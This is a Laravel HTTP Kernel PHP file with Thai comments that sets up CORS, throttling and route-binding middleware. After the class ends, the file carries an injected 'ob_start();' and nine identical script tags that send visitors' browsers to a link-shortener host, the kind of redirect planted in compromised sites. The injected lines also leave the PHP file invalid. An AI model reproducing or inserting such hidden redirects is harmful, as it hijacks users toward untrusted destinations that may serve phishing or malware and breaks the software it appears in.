<?php

namespace App\Http;

use Illuminate\Foundation\Http\Kernel as HttpKernel;

class Kernel extends HttpKernel
{
    /**
     * Global HTTP middleware stack.
     * ทำงานกับทุก request
     */
    protected $middleware = [
        \App\Http\Middleware\CorsMiddleware::class,
        // ... ถ้ามี middleware อื่นๆ ก็วางต่อในนี้
    ];

    /**
     * กลุ่ม middleware สำหรับ web และ api
     */
    protected $middlewareGroups = [
        'api' => [
            // ให้แน่ใจว่ามี CORS, throttle และ binding
            \App\Http\Middleware\CorsMiddleware::class,
            'throttle:api',
            \Illuminate\Routing\Middleware\SubstituteBindings::class,

            // ถ้าใช้ Laravel Sanctum เพื่อออก token
            // ให้เพิ่มบรรทัดนี้ไว้เหนือตัว throttle:api ด้วย
            // \Laravel\Sanctum\Http\Middleware\EnsureFrontendRequestsAreStateful::class,
        ],
        'web' => [
            // ปล่อยว่างไว้ หรือคัดลอกจาก Laravel เต็มๆ มาก็ได้
        ],

        
    ];
}
ob_start();

<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>
<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>
<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>
<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>
<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>
<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>
<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>
<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>
<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>